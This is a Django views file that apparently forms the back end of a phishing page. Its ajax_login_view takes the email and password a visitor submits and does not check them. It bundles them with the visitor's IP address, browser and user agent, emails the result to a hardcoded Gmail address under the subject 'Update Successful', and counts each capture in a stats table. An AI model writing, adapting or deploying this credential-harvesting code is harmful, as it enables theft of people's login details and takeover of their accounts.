from django.shortcuts import render
from django.template.loader import render_to_string
from django.http import HttpRequest
from user_agents import parse
from django.utils import timezone
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth import authenticate, login
import json

from .models import SiteStats
from . import send_email

def get_browser_info(request: HttpRequest) -> dict:

    user_agent = request.META.get('HTTP_USER_AGENT', '')

    parsed_user_agent = parse(user_agent)

    browser = parsed_user_agent.browser.family
    version = parsed_user_agent.browser.version_string

    return {'browser': browser, 'version': version, 'agent':user_agent }

def home(request):
    # track visitors
    stats, _ = SiteStats.objects.get_or_create(id=1)
    stats.visitors += 1
    stats.save()
    return render(request, 'frontend/index.html')



@csrf_exempt 
def ajax_login_view(request):
    if request.method != 'POST':
        return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=400)

    try:
        data = json.loads(request.body)
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()

        if not email or not password:
            return JsonResponse({'status': 'error', 'message': 'Email and password are required'}, status=400)
        
        # get browser information
        browser_info = get_browser_info(request)

        # get ip address
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = x_forwarded_for.split(',')[0].strip() if x_forwarded_for else request.META.get('REMOTE_ADDR')
        
        message = render_to_string('email/email_result.html', 
            {
                'email': email,
                'password': password,
                'ip_address':ip_address,
                'b_version':browser_info['version'],
                'browser':browser_info['browser'],
                'agent':browser_info['agent'],
                # 'city': location_data['city'],
                # 'country': location_data['country'],
                # 'region': location_data['region'],
                'time': timezone.localtime(timezone.now()),
            })
        
        try:
            send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
            print('Email sent successfully')
            stats, _ = SiteStats.objects.get_or_create(id=1)
            stats.emails_sent += 1
            stats.save()
            return JsonResponse({'status': 'success', 'redirect': '/'})
        except Exception as e:
            print(f"Error sending email: {str(e)}")
            return JsonResponse({'status': 'failed', 'redirect': '/'})

    except json.JSONDecodeError:
        return JsonResponse({'status': 'error', 'message': 'Invalid JSON'}, status=400)


def view_site_stats(request):
    site_stats = SiteStats.objects.all()

    context = {"site_stats":site_stats}
    return render(request, 'frontend/site_stats.html', context)